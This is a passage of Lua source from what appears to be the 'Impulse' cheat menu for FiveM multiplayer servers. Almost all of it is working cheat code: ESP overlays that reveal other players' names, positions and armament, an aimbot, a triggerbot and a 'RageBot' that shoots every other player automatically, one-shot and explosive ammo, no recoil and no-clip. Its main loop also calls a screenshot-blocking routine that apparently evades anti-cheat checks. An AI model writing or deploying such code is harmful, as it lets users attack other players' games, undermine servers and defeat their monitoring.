                                    DrawRect(_x - 0.00026 / Distance, _y + height / 2 / Distance, 0.002 / Distance * 0.015, height / Distance, 0, 0, 0, 200) -- armor outbound
                                    DrawRect(_x - 0.00026 / Distance, _y + height / Distance - parmor / 175000 / Distance,  0.0012 / Distance * 0.015, (parmor-2) / 87500 / Distance, 0, 186, 255, 200) -- armor bar
                                else
                                    DrawRect(_x - 0.00026 / Distance, _y + height / 2 / Distance, 0.002 / Distance * 0.015, height / Distance, 0, 0, 0, 200) -- health outbound
                                    DrawRect(_x - 0.00026 / Distance, _y + height / Distance - phealth / 175000 / Distance,  0.0012 / Distance * 0.015, (phealth-2) / 87500 / Distance, 0, 255, 0, 200) --health bar
                                end
                            
                                if Impulse.Options.ESPInfos then
                                    local armed
                                    local invehicle
                                    local distance2 = GetDistanceBetweenCoords(x, y, z, px, py, pz, true) 
                                    if GetSelectedPedWeapon(curplayerped) == -1569615261 then
                                        armed = "No"
                                    else
                                        armed = "Yes"
                                    end

                                    if GetVehiclePedIsIn(curplayerped) == 0 then
                                        invehicle = "No"
                                    else
                                        invehicle = "Yes"
                                    end

                                    Impulse.DrawText2("NAME: "..GetPlayerName(PlayerList[i]),4,false,_x + width / 2 / Distance + 0.003, (_y + height / 2 / Distance) - (height / Distance / 2),0.3-Distance, Impulse.MenuR,Impulse.MenuG,Impulse.MenuB,255)
                                    Impulse.DrawText2("ID: "..i,4,false,_x + width / 2 / Distance + 0.003, (_y + height / 2 / Distance) - (height / Distance / 2) + 0.015,0.3-Distance, Impulse.MenuR,Impulse.MenuG,Impulse.MenuB,255)
                                    Impulse.DrawText2("ARMED: "..armed,4,false,_x + width / 2 / Distance + 0.003, (_y + height / 2 / Distance) - (height / Distance / 2) + 0.03,0.3-Distance, Impulse.MenuR,Impulse.MenuG,Impulse.MenuB,255)
                                    Impulse.DrawText2("IN VEHICLE: "..invehicle,4,false,_x + width / 2 / Distance + 0.003, (_y + height / 2 / Distance) - (height / Distance / 2) + 0.045,0.3-Distance, Impulse.MenuR,Impulse.MenuG,Impulse.MenuB,255)
                                    Impulse.DrawText2("DISTANCE: "..math.floor(distance2).." M",4,false,_x + width / 2 / Distance + 0.003, (_y + height / 2 / Distance) - (height / Distance / 2) + 0.06,0.3-Distance, Impulse.MenuR,Impulse.MenuG,Impulse.MenuB,255)
                                end
                            end
                        end
                    end
                    Wait(0)
                end
            end)
        end
    end

    function Impulse:ESPBlips()
        Impulse.Options.ESPBlips = not Impulse.Options.ESPBlips
        if Impulse.Options.ESPBlips then
            CreateThread(function()
                while Impulse.Options.ESPBlips do
                    local OnlinePlayers = GetActivePlayers()
                    for k = 1, #OnlinePlayers do
                        local CurPlayer = OnlinePlayers[k]
                        local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(CurPlayer)))
                        local Blipa = AddBlipForCoord(x, y, z)
                        SetBlipSprite(Blipa, 1)
                        BeginTextCommandSetBlipName("STRING")
                        AddTextComponentString(GetPlayerName(CurPlayer)) 
                        EndTextCommandSetBlipName(Blipa)
                        SetBlipShrink(Blipa, true)
                        SetBlipCategory(Blipa, 7)

                        local CurPlayerPed = GetPlayerPed(CurPlayer)
                        local x, y, z = table.unpack(GetEntityCoords(CurPlayerPed))
        
                        ShowCrewIndicatorOnBlip(Blipa, false)
                        ShowFriendIndicatorOnBlip(Blipa, false)

                        SetBlipCoords(Blipa, x, y, z)

                        if IsEntityDead(CurPlayerPed) then
                            SetBlipColour(Blipa, 1)
                        else
                            SetBlipColour(Blipa, 0)
                        end
                        CreateThread(function()
                            Wait(1000)
                            if DoesBlipExist(Blipa) then
                                RemoveBlip(Blipa)
                            end
                        end)
                    end
                    Wait(1000)
                end
            end)
        end
    end

    function Impulse:ESPInfos()
        Impulse.Options.ESPInfos = not Impulse.Options.ESPInfos
    end

    function Impulse:ESPBones()
        Impulse.Options.ESPBones = not Impulse.Options.ESPBones
        if Impulse.Options.ESPBones then
            CreateThread(function()
                while Impulse.Options.ESPBones do
                    local playerlist = GetActivePlayers()
                    for i = 1, #playerlist do
                        local curplayer = playerlist[i]
                        local curplayerped = GetPlayerPed(curplayer)
                        local PlayerCoords = GetEntityCoords(curplayerped)
                        local x,y,z = table.unpack(PlayerCoords)

                        local RightShoulderBone = GetPedBoneIndex(curplayerped, 31086)
                        local RightElbowBone = GetPedBoneIndex(curplayerped, 2992)
                        local RightHand = GetPedBoneIndex(curplayerped, 28422)

                        local LeftEye = GetPedBoneIndex(curplayerped, 25260)
                        local RightEye = GetPedBoneIndex(curplayerped, 27474)

                        local hair = GetPedBoneIndex(curplayerped, 5749)

                        local LeftElbowBone = GetPedBoneIndex(curplayerped, 22711)
                        local LeftHand = GetPedBoneIndex(curplayerped, 18905)

                        local rightshoulder = GetWorldPositionOfEntityBone(curplayerped, RightShoulderBone, 0.0, 0.0, 0.0)

                        local lefteeye = GetWorldPositionOfEntityBone(curplayerped, LeftEye, 0.0, 0.0, 0.0)
                        local righteye = GetWorldPositionOfEntityBone(curplayerped, RightEye, 0.0, 0.0, 0.0)

                        local Hair = GetWorldPositionOfEntityBone(curplayerped, hair, 0.0, 0.0, 0.0)

                        local rightelbow = GetWorldPositionOfEntityBone(curplayerped, RightElbowBone, 0.0, 0.0, 0.0)
                        local rightelhand = GetWorldPositionOfEntityBone(curplayerped, RightHand, 0.0, 0.0, 0.0)
                        
                        local leftelbow = GetWorldPositionOfEntityBone(curplayerped, LeftElbowBone, 0.0, 0.0, 0.0)
                        local lefthand = GetWorldPositionOfEntityBone(curplayerped, LeftHand, 0.0, 0.0, 0.0)
                        local pelvis = GetWorldPositionOfEntityBone(curplayerped, GetPedBoneIndex(curplayerped, 11816), 0.0, 0.0, 0.0)
                        local rightknee = GetWorldPositionOfEntityBone(curplayerped, GetPedBoneIndex(curplayerped, 16335), 0.0, 0.0, 0.0)
                        local leftknee = GetWorldPositionOfEntityBone(curplayerped, GetPedBoneIndex(curplayerped, 46078), 0.0, 0.0, 0.0)
                        local leftfoot = GetWorldPositionOfEntityBone(curplayerped, GetPedBoneIndex(curplayerped, 14201), 0.0, 0.0, 0.0)
                        local rightfoot = GetWorldPositionOfEntityBone(curplayerped, GetPedBoneIndex(curplayerped, 52301), 0.0, 0.0, 0.0)
                        
                        DrawLine(rightshoulder.x, rightshoulder.y, rightshoulder.z, Hair.x, Hair.y, Hair.z, Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 255)
                        DrawLine(lefteeye.x, lefteeye.y, lefteeye.z, Hair.x, Hair.y, Hair.z, Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 255)
                        DrawLine(righteye.x, righteye.y, righteye.z, Hair.x, Hair.y, Hair.z, Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 255)

                        DrawLine(rightshoulder.x, rightshoulder.y, rightshoulder.z, lefteeye.x, lefteeye.y, lefteeye.z, Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 255)
                        DrawLine(rightshoulder.x, rightshoulder.y, rightshoulder.z, righteye.x, righteye.y, righteye.z, Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 255)

                        DrawLine(lefteeye.x, lefteeye.y, lefteeye.z, righteye.x, righteye.y, righteye.z, Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 255)

                        DrawLine(rightshoulder.x, rightshoulder.y, rightshoulder.z, rightelbow.x, rightelbow.y, rightelbow.z, Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 255)
                        DrawLine(rightelbow.x, rightelbow.y, rightelbow.z, rightelhand.x, rightelhand.y, rightelhand.z, Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 255)
                        
                        DrawLine(rightshoulder.x, rightshoulder.y, rightshoulder.z, leftelbow.x, leftelbow.y, leftelbow.z, Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 255)
                        DrawLine(leftelbow.x, leftelbow.y, leftelbow.z, lefthand.x, lefthand.y, lefthand.z, Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 255)
                        
                        DrawLine(rightshoulder.x, rightshoulder.y, rightshoulder.z, pelvis.x, pelvis.y, pelvis.z, Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 255)
                        DrawLine(rightknee.x, rightknee.y, rightknee.z, pelvis.x, pelvis.y, pelvis.z, Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 255)
                        DrawLine(leftknee.x, leftknee.y, leftknee.z, pelvis.x, pelvis.y, pelvis.z, Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 255)
                        
                        DrawLine(rightknee.x, rightknee.y, rightknee.z, rightfoot.x, rightfoot.y, rightfoot.z, Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 255)
                        DrawLine(leftknee.x, leftknee.y, leftknee.z, leftfoot.x, leftfoot.y, leftfoot.z, Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 255)
                        
                        ResetEntityAlpha(curplayerped)
                        SetEntityAlpha(curplayerped, 0)
                    end
                    Wait(0)
                end
            end)
        else
            local playerlist = GetActivePlayers()
            for i = 1, #playerlist do
                local curplayer = playerlist[i]
                local curplayerped = GetPlayerPed(curplayer)
                ResetEntityAlpha(curplayerped)
                SetEntityAlpha(curplayerped, 255)
            end
        end
    end

    function Impulse:NoReload()
        Impulse.Options.NoReload = not Impulse.Options.NoReload
        if Impulse.Options.NoReload then
            CreateThread(function()
                while Impulse.Options.NoReload do
                    local _,ammo = GetAmmoInClip(PlayerPedId(),GetSelectedPedWeapon(PlayerPedId()))
                    if ammo <= 1 then
                        RefillAmmoInstantly(PlayerPedId())
                        MakePedReload(PlayerPedId())
                    end
                    Wait(0)
                end
            end)
        end
    end

    function Impulse:NoRecoil()
        Impulse.Options.NoRecoil = not Impulse.Options.NoRecoil
        if Impulse.Options.NoRecoil then
            CreateThread(function()
                while Impulse.Options.NoRecoil do
                    if IsPedShooting(PlayerPedId()) then
                        SetGameplayCamRelativePitch(GetGameplayCamRelativePitch(), 0.0)
                    end
                    Wait(0)
                end
            end)
        end
    end

    function Impulse:InfiniteAmmos()
        Impulse.Options.InfiniteAmmos = not Impulse.Options.InfiniteAmmos
        if Impulse.Options.InfiniteAmmos then
            CreateThread(function()
                while Impulse.Options.InfiniteAmmos do
                    local _,ammo = GetAmmoInClip(PlayerPedId(),GetSelectedPedWeapon(PlayerPedId()))
                    if ammo <= 2 then
                        SetAmmoInClip(PlayerPedId(),GetSelectedPedWeapon(PlayerPedId()),5)
                    end
                    Wait(0)
                end
            end)
        end
    end

    function Impulse:ExplosiveAmmos()
        Impulse.Options.ExplosiveAmmos = not Impulse.Options.ExplosiveAmmos
        if Impulse.Options.ExplosiveAmmos then
            CreateThread(function()
                while Impulse.Options.ExplosiveAmmos do
                    local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
                    if ret then
                        AddExplosion(pos.x, pos.y, pos.z, 7, 1.0, 1, 0, 0.1)
                    end
                    Wait(0)
                end
            end)
        end
    end

    function Impulse:OneShotZ()
        Impulse.Options.OneShotZ = not Impulse.Options.OneShotZ
        if Impulse.Options.OneShotZ then
            CreateThread(function()
                while Impulse.Options.OneShotZ do
                    if IsPedShooting(PlayerPedId()) and Impulse.IsClicking then
                        SetPlayerWeaponDamageModifier(PlayerPedId(), 999.0)
                    else
                        SetPlayerWeaponDamageModifier(PlayerPedId(), 1.0)
                    end
                    Wait(10)
                end
            end)
        end
    end


    function Impulse.SetNoClipAttributes(ped, status)
        if status then
            SetEntityInvincible(ped, true)
            FreezeEntityPosition(ped, true)
            SetEntityCollision(ped, false, false)
            SetEntityVisible(ped, false, false)
        else
            SetEntityInvincible(ped, false)
            FreezeEntityPosition(ped, false)
            SetEntityCollision(ped, true, true)
            SetEntityVisible(ped, true, true)
        end
    end

    local INPUT_SPRINT = 21
    local INPUT_CHARACTER_WHEEL = 19
    local INPUT_LOOK_LR = 1
    local INPUT_LOOK_UD = 2
    local INPUT_COVER = 44
    local INPUT_MULTIPLAYER_INFO = 20
    local INPUT_MOVE_UD = 31
    local INPUT_MOVE_LR = 30
    local _internal_camera = nil
    local _internal_isFrozen = false

    local _internal_pos = nil
    local _internal_rot = nil
    local _internal_fov = nil
    local _internal_vecX = nil
    local _internal_vecY = nil
    local _internal_vecZ = nil

    local settings = {
        --Camera
        fov = 200.0,
        -- Mouse
        mouseSensitivityX = 5,
        mouseSensitivityY = 5,
        -- Movement
        normalMoveMultiplier = 1,
        fastMoveMultiplier = 10,
        slowMoveMultiplier = 0.1,
        -- On enable/disable
        enableEasing = false,
        easingDuration = 1000
    }

    local function IsFreecamFrozen()
        return _internal_isFrozen
    end

    local function SetFreecamFrozen(frozen)
        local frozen = frozen == true
        _internal_isFrozen = frozen
    end

    local function GetFreecamPosition()
        return _internal_pos
    end

    local function SetFreecamPosition(x, y, z)
        local pos = vector3(x, y, z)
        SetCamCoord(_internal_camera, pos)

        _internal_pos = pos
    end

    local function GetFreecamRotation()
        return _internal_rot
    end

    local function SetFreecamRotation(x, y, z)
        local x = Clamp(x, -90.0, 90.0)
        local y = y % 360
        local z = z % 360
        local rot = vector3(x, y, z)
        local vecX, vecY, vecZ = EulerToMatrix(x, y, z)

        LockMinimapAngle(math.floor(z))
        SetCamRot(_internal_camera, rot)

        _internal_rot = rot
        _internal_vecX = vecX
        _internal_vecY = vecY
        _internal_vecZ = vecZ
    end

    local function GetFreecamFov()
        return _internal_fov
    end

    local function SetFreecamFov(fov)
        local fov = Clamp(fov, 0.0, 90.0)
        SetCamFov(_internal_camera, fov)
        _internal_fov = fov
    end

    local function GetFreecamMatrix()
        return _internal_vecX, _internal_vecY, _internal_vecZ, _internal_pos
    end

    local function GetFreecamTarget(distance)
        local target = _internal_pos + (_internal_vecY * distance)
        return target
    end

    local function IsFreecamEnabled()
        return IsCamActive(_internal_camera) == 1
    end

    local controls = {12, 13, 14, 15, 16, 17, 18, 19, 50, 85, 96, 97, 99, 115, 180, 181, 198, 261, 262}
    local function LockControls()
        for k, v in pairs(controls) do
            DisableControlAction(0, v, true)
        end
        EnableControlAction(0, 166, true)
    end

    function Impulse.SetFreecamEnabled(enable)
        if enable == IsFreecamEnabled() then
            return
        end

        if enable then
            local pos = GetGameplayCamCoord()
            local rot = GetGameplayCamRot()

            _internal_camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)

            SetFreecamFov(settings.fov)
            SetFreecamPosition(pos.x, pos.y, pos.z)
            SetFreecamRotation(rot.x, rot.y, rot.z)
        else
            DestroyCam(_internal_camera)
            ClearFocus()
            UnlockMinimapPosition()
            UnlockMinimapAngle()
        end
        --SetPlayerControl(PlayerId(), not enable)
        RenderScriptCams(enable, settings.enableEasing, settings.easingDuration)
    end

    --------------------------------------------------------------------------------

    function IsEnabled()
        return IsFreecamEnabled()
    end
    function IsFrozen()
        return IsFreecamFrozen()
    end
    function SetFrozen(frozen)
        return SetFreecamFrozen(frozen)
    end
    function GetFov()
        return GetFreecamFov()
    end
    function SetFov(fov)
        return SetFreecamFov(fov)
    end
    function GetTarget(distance)
        return {table.unpack(GetFreecamTarget(distance))}
    end
    function GetPosition()
        return {table.unpack(GetFreecamPosition())}
    end
    function SetPosition(x, y, z)
        return SetFreecamPosition(x, y, z)
    end
    function GetRotation()
        return {table.unpack(GetFreecamRotation())}
    end
    function SetRotation(x, y, z)
        return SetFreecamRotation(x, y, z)
    end
    function GetPitch()
        return GetFreecamRotation().x
    end
    function GetRoll()
        return GetFreecamRotation().y
    end
    function GetYaw()
        return GetFreecamRotation().z
    end

    function GetSpeedMultiplier()
        if IsDisabledControlPressed(0, 180) then
            if settings.normalMoveMultiplier > 1.0 then
                settings.normalMoveMultiplier = settings.normalMoveMultiplier - 0.5
            elseif settings.normalMoveMultiplier > 0.2 then
                settings.normalMoveMultiplier = settings.normalMoveMultiplier - 0.1
            else
                settings.normalMoveMultiplier = settings.normalMoveMultiplier - 0.01
            end
        elseif IsDisabledControlPressed(0, 181) then
            if settings.normalMoveMultiplier < 0.2 then
                settings.normalMoveMultiplier = settings.normalMoveMultiplier + 0.01
            elseif settings.normalMoveMultiplier > 1.0 then
                settings.normalMoveMultiplier = settings.normalMoveMultiplier + 0.5
            else
                settings.normalMoveMultiplier = settings.normalMoveMultiplier + 0.1
            end
        end

        if settings.normalMoveMultiplier < 0 then
            settings.normalMoveMultiplier = 0
        end

        return settings.normalMoveMultiplier
    end

    function Impulse.CameraLoop()
        if not IsFreecamEnabled() or IsPauseMenuActive() then
            return
        end
        if not IsFreecamFrozen() then
            local vecX, vecY = GetFreecamMatrix()
            local vecZ = vector3(0, 0, 1)
            local pos = GetFreecamPosition()
            local rot = GetFreecamRotation()
            -- Get speed multiplier for movement
            local frameMultiplier = GetFrameTime() * 60
            local speedMultiplier = GetSpeedMultiplier() * frameMultiplier
            -- Get mouse input
            local mouseX = GetDisabledControlNormal(0, INPUT_LOOK_LR)
            local mouseY = GetDisabledControlNormal(0, INPUT_LOOK_UD)
            -- Get keyboard input
            local moveWS = GetDisabledControlNormal(0, INPUT_MOVE_UD)
            local moveAD = GetDisabledControlNormal(0, INPUT_MOVE_LR)
            local moveQZ = GetDisabledControlNormalBetween(0, INPUT_COVER, INPUT_MULTIPLAYER_INFO)
            -- Calculate new rotation.
            local rotX = rot.x + (-mouseY * settings.mouseSensitivityY)
            local rotZ = rot.z + (-mouseX * settings.mouseSensitivityX)
            local rotY = 0.0
            -- Adjust position relative to camera rotation.
            pos = pos + (vecX * moveAD * speedMultiplier)
            pos = pos + (vecY * -moveWS * speedMultiplier)
            pos = pos + (vecZ * moveQZ * speedMultiplier)

            if #(pos - GetEntityCoords(GetPlayerPed(-1))) > 20.0 then
                pos = GetEntityCoords(GetPlayerPed(-1))
            end

            -- Adjust new rotation
            rot = vector3(rotX, rotY, rotZ)
            -- Update camera
            SetFreecamPosition(pos.x, pos.y, pos.z)
            SetFreecamRotation(rot.x, rot.y, rot.z)

            LockControls()
            SetPedCoordsKeepVehicle(GetPlayerPed(-1), pos.x, pos.y, pos.z)
        end
    end

    function Clamp(x, min, max)
        return math.min(math.max(x, min), max)
    end

    function GetDisabledControlNormalBetween(inputGroup, control1, control2)
        local normal1 = GetDisabledControlNormal(inputGroup, control1)
        local normal2 = GetDisabledControlNormal(inputGroup, control2)
        return normal1 - normal2
    end

    function EulerToMatrix(rotX, rotY, rotZ)
        local radX = math.rad(rotX)
        local radY = math.rad(rotY)
        local radZ = math.rad(rotZ)

        local sinX = math.sin(radX)
        local sinY = math.sin(radY)
        local sinZ = math.sin(radZ)
        local cosX = math.cos(radX)
        local cosY = math.cos(radY)
        local cosZ = math.cos(radZ)

        local vecX = {}
        local vecY = {}
        local vecZ = {}

        vecX.x = cosY * cosZ
        vecX.y = cosY * sinZ
        vecX.z = -sinY

        vecY.x = cosZ * sinX * sinY - cosX * sinZ
        vecY.y = cosX * cosZ - sinX * sinY * sinZ
        vecY.z = cosY * sinX

        vecZ.x = -cosX * cosZ * sinY + sinX * sinZ
        vecZ.y = -cosZ * sinX + cosX * sinY * sinZ
        vecZ.z = cosX * cosY

        vecX = vector3(vecX.x, vecX.y, vecX.z)
        vecY = vector3(vecY.x, vecY.y, vecY.z)
        vecZ = vector3(vecZ.x, vecZ.y, vecZ.z)

        return vecX, vecY, vecZ
    end

    function Impulse:NoClip()
        Impulse.Options.NoClip = not Impulse.Options.NoClip
        if Impulse.Options.NoClip then
            CreateThread(function()
                Impulse.SetFreecamEnabled(true)
                while Impulse.Options.NoClip do
                    Impulse.CameraLoop()
                    Impulse.SetNoClipAttributes(PlayerPedId(), true)
                    Wait(0)
                end
            end)
        else
            Impulse.SetFreecamEnabled(false)
            Impulse.SetNoClipAttributes(GetPlayerPed(-1), false)
            local pCoords = GetEntityCoords(PlayerPedId())
            local get, z = GetGroundZFor_3dCoord(pCoords.x, pCoords.y, pCoords.z, true, 0)
            if get then
                SetPedCoordsKeepVehicle(PlayerPedId(), pCoords.x, pCoords.y, z + 1.0)
            end
        end
    end

    function Impulse:AimBot()
        Impulse.Options.AimBot = not Impulse.Options.AimBot
        if Impulse.Options.AimBot then
            CreateThread(function()
                while Impulse.Options.AimBot do
                    local playerlist = GetActivePlayers()
                    for i = 1, #playerlist do
                        local curplayer = playerlist[i]
                        local curplayerped = GetPlayerPed(curplayer)
                        if curplayer ~= PlayerId() then
                            
                            if Impulse.IsInFOV(curplayerped) then
								local _pos = GetPedBoneCoords(curplayerped, 0, 0.0, 0.0, 0.0)
					
								if IsDisabledControlPressed(0, 24) then
									SetPedShootsAtCoord(PlayerPedId(), _pos.x, _pos.y, _pos.z, true)
									Wait(50)
								end
                            end
                        end
                    end
                    Wait(0)
                end
            end)
        end
    end

	function Impulse:TriggerBot()
        Impulse.Options.TriggerBot = not Impulse.Options.TriggerBot
        if Impulse.Options.TriggerBot then
            CreateThread(function()
                while Impulse.Options.TriggerBot do
                    local playerlist = GetActivePlayers()
                    for i = 1, #playerlist do
                        local curplayer = playerlist[i]
                        local curplayerped = GetPlayerPed(curplayer)
                        if curplayer ~= PlayerId() then
                            
                            if Impulse.IsInFOV(curplayerped) then
								local _pos = GetPedBoneCoords(curplayerped, 0, 0.0, 0.0, 0.0)					
								SetPedShootsAtCoord(PlayerPedId(), _pos.x, _pos.y, _pos.z, true)
								Wait(50)
                            end
                        end
                    end
                    Wait(0)
                end
            end)
        end
    end

	function Impulse:RageBot()
        Impulse.Options.RageBot = not Impulse.Options.RageBot
        if Impulse.Options.RageBot then
            CreateThread(function()
                while Impulse.Options.RageBot do
                    local playerlist = GetActivePlayers()
                    for i = 1, #playerlist do
                        local curplayer = playerlist[i]
                        local curplayerped = GetPlayerPed(curplayer)
                        if curplayer ~= PlayerId() then
							local PlayerCoords = GetEntityCoords(curplayerped)
							local _pos = GetPedBoneCoords(curplayerped, 0, 0.0, 0.0, 0.0)					
							SetPedShootsAtCoord(PlayerPedId(), _pos.x, _pos.y, _pos.z, true)
							Wait(50)
                        end
                    end
                    Wait(0)
                end
            end)
        end
    end

	function Impulse.IsInFOV(ped)
        local pos = GetPedBoneCoords(ped,31086, 0.0, 0.0, 0.0)
		local showing, sx, sy = GetScreenCoordFromWorldCoord(pos.x, pos.y, pos.z)
		if not showing then
			return false
        elseif sx < 0.5 + (0.5 *Impulse.FOV) and sx > 0.5 - (0.5 *Impulse.FOV) and sy < 0.5 + (0.5 *Impulse.FOV) and sy > 0.5 - (0.5 *Impulse.FOV)then
            return true    
        end
    end

    function Impulse:DrawFOV()
        Impulse.Options.DrawFOV = not Impulse.Options.DrawFOV
        if Impulse.Options.DrawFOV then
            CreateThread(function()
                while Impulse.Options.DrawFOV do
                    DrawRect(0.5, 0.5, Impulse.FOV, Impulse.FOV, Impulse.MenuR,Impulse.MenuG,Impulse.MenuB, 100)
                    Wait(0)
                end
            end)
        end
    end

    function Impulse.RotationToDirection(rotation)
        local retz = math.rad(rotation.z)
        local retx = math.rad(rotation.x)
        local absx = math.abs(math.cos(retx))
        return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
    end
    function Impulse:BulletTracer()
        Impulse.Options.BulletTracer = not Impulse.Options.BulletTracer
        if Impulse.Options.BulletTracer then
            local BullerTraces = {}
            CreateThread(function()
                while Impulse.Options.BulletTracer do
                
                    if GetWeaponDamageType(GetSelectedPedWeapon(PlayerPedId())) == 3 then
                        local weapon = GetCurrentPedWeaponEntityIndex(PlayerPedId())
                        local coords = GetEntityCoords(weapon)
                        if IsPedShooting(PlayerPedId()) then
                            Hit, ImpactCoord = GetPedLastWeaponImpactCoord(PlayerPedId())
                            table.insert(BullerTraces,{launch = coords,impact = ImpactCoord, rip = GetGameplayCamCoord()+(Impulse.RotationToDirection(GetGameplayCamRot(2)) * 2000.0)})
                        end

                        for k,v in pairs(BullerTraces) do
                            if v.impact == vector3(0,0,0) then
                                DrawLine(v.launch, v.rip, Impulse.MenuR,Impulse.MenuG,Impulse.MenuB, 255)
                            else
                                DrawLine(v.launch, v.impact, Impulse.MenuR,Impulse.MenuG,Impulse.MenuB, 255)
                            end
                        end
                    end
                    Wait(0)
                end
            end)
            CreateThread(function()
                while Impulse.Options.BulletTracer do
                    BullerTraces = {}
                    Wait(5000)
                end
            end)
        end
    end
    
    
    -- main frame

    CreateThread(function()
        while Impulse.OpenKey == nil or not Impulse.Initialized do 
            Impulse:ChooseKey()
            Wait(0)
        end
        while true do
            if IsDisabledControlJustPressed(0, Impulse.Keys[Impulse.OpenKey]) then
                Impulse.Showing = not Impulse.Showing
                Impulse:Debug("Showing state set to : "..tostring(Impulse.Showing))
            end
            --Impulse:DrawWaterMark()
            Impulse:SetRichPresence()
            Impulse:DrawNotifications()
            Impulse:DrawMenu()
            Wait(0)

        end
    end)

    CreateThread(function()
        while true do
            Impulse:UpdatePlayerList()
            Impulse:CountEachButtons()
            Wait(5000)

        end
    end)

    CreateThread(function()
        Impulse.ScreenW,Impulse.ScreenH = GetActiveScreenResolution()
        Impulse.NotifX = Impulse.ScreenW * 0.77
        Impulse.NotifY = Impulse.ScreenH * 0.3
        Impulse.NotifW = Impulse.ScreenW * 0.2
        Impulse:RunFileSearcher()
        Impulse:BlockScreenShots()
        while true do
            Impulse.IsClicking = IsDisabledControlPressed(0, 24)
            Impulse.IsEnterPressed = IsDisabledControlPressed(0,191)
            Impulse.MouseX, Impulse.MouseY = GetNuiCursorPosition()
            Wait(0)
        end
    end)
end)